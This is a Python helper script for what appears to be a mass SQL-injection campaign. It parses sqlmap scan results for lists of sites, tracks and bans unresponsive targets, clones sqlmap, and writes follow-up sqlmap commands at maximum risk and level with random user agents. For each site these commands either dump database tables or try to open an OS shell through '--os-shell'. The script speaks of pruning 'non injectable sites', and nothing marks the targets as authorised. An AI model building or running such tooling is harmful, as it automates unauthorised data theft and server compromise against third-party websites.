import sys
import os


SITES_FILE=os.getenv("SITES_FILE")
BANNING_FILE=os.getenv("BANNING_FILE")
BANNED_KEYWORDS_FILE=os.getenv("BANNED_KEYWORDS_FILE")
SQLMAP_PATH=os.getenv("SQLMAP_PATH")

def append_site_on_file(site, file_name):

	#while lock:
	#	print("waiting for %s To be Unlocked" % (file))
	#lock = True

	file = open(file_name, "a")

	file.write('%s' % site)
	file.close()

	#lock = False


def test_if_ban(liste, site):
	if site[-1] == '\n':
		site = site[0:-1]
	num_of_tests = 1
	result = False
	for site_to_check in liste:

		if site_to_check.find(site) != -1:

			liste.remove(site_to_check)
			num_of_tests = int(site_to_check.split(":")[1])
			if num_of_tests > 5:
				result = True
				print(site + " banned")
			else:
				num_of_tests = num_of_tests + 1

				result = False
			break
	if not result:

		liste.append(site + ":" + str(num_of_tests) + "\n")
	#while banning_file_lock:
	#	print("waiting for %s To be Unlocked" % (BANNING_FILE))
#	banning_file_lock = True

	files = open(BANNING_FILE, "w")
	files.writelines(liste)
	files.close()

#	banning_file_lock = False

	return result


def filter_results():
	files = os.listdir("finished")
	for file in files:
		db_list = []
		if file[0] != ".":
			print("Checking file " + file, end="")
			f = open("finished/" + file, "r")
			found = False
			lines = f.readlines()
			if len(lines) > 1:
				site = lines[0]
				if site[-1] == "\n":
					site = site[:-1]
				lines = lines[1:]
			for line in lines:
				if line.find("[*] ") != -1 and line.find("[*] ending") == - \
						1 and line.find("[*] starting") == -1:
					db_list.append(
						line.replace(
							'\n', '')[
							line.find("[*] ") + 4:])
				if line.find("fetched data logged") != -1:
					found = True
			if not found:
				os.remove("finished/" + file)
				print("\n")
				list_of_removed = get_sites(BANNING_FILE)

				if test_if_ban(list_of_removed,
							   file[:-7] + "\n"):
					append_site_on_file(file[:-7] + "\n",BANNED_KEYWORDS_FILE)

			else:
				if len(db_list) > 0:
					print(" Found db\n")
					with open("dbs/" + file, "w+") as result:
						result.write(site + "\n")
						for db in db_list:
							result.write(
								"python " +
								SQLMAP_PATH +
								"/sqlmap/sqlmap.py -u \"%s\" --risk 3 --level 5 --batch --random-agent -D " %
								(site,
								 ) +
								db +
								" --tables\n")
						result.close()
					os.remove("finished/" + file)
				else:
					print(" Found but not db\n")
					with open("maybe/" + file, "w+") as result:
						result.write(site + "\n")
						result.write( "python " + SQLMAP_PATH + "/sqlmap/sqlmap.py -u \"%s\" --risk 3 --level 5 --batch --random-agent --os-shell " % (site,  ) + "\n")
						result.close()
					os.remove("finished/" + file)

			f.close()


def get_sites(file_name):

	#while lock:
	#	print("waiting for %s To be Unlocked" % (file_name))
	#lock = True

	files = open(file_name, "r")
	sites = files.readlines()

	return sites

def clean_sites_file():


	if SITES_FILE==None:
		print("Error : You need to set SITES_FILE\nTry : export SITES_FILE=\"sites.txt\"")

	if not os.path.isfile(SITES_FILE):
		with open(SITES_FILE,mode="w") as new_file:
			new_file.close() 

	os.system("wc -l "+SITES_FILE)
	os.system("vi "+SITES_FILE+" -c ':g/https*:\/\/[^\/]*\/$/d' -c ':wq!'")
	os.system("wc -l "+SITES_FILE)



def filter():
	exit_err=False
	if BANNING_FILE==None:
		print("Error : You need to set BANNING_FILE\nTry : export BANNING_FILE=\"banned.txt\"")
		exit_err=True
	if BANNED_KEYWORDS_FILE==None:
		print("Error : You need to set BANNED_KEYWORDS_FILE\nTry : export BANNED_KEYWORDS_FILE=\"banningIA.txt\"")
		exit_err=True
	if SQLMAP_PATH==None:
		print("Error : You need to set SQLMAP_PATH\nTry : export SQLMAP_PATH=\"..\"")
		exit_err=True

	if exit_err:
		exit(-1)

	if not os.path.exists(SQLMAP_PATH+"/sqlmap"):
		print("Getting sqlmap in "+SQLMAP_PATH+"/sqlmap")
		os.system("git clone https://github.com/sqlmapproject/sqlmap.git "+SQLMAP_PATH+"/sqlmap")
	else:
		print("Updating sqlmap")
		os.system("git -C "+SQLMAP_PATH+"/sqlmap pull")

	filter_results()

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage : utils.py action\n\taction :\n\t\tfilter : filter results\n\t\tclean_sites_file s: remove non injectable sites from list")
		exit(-1)
	elif sys.argv[1]=="filter":
		filter()
	elif sys.argv[1]=="clean_sites_file":
		clean_sites_file()
	elif sys.argv[1]=="threads":
		print(os.popen("ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d'").read())
	else:
		print("Usage : utils.py action\n\taction :\n\t\tfilter : filter results\n\t\tclean_sites_file : remove non injectable sites from list\n\t\tthreads : print all sqlmap threads")
		exit(-1)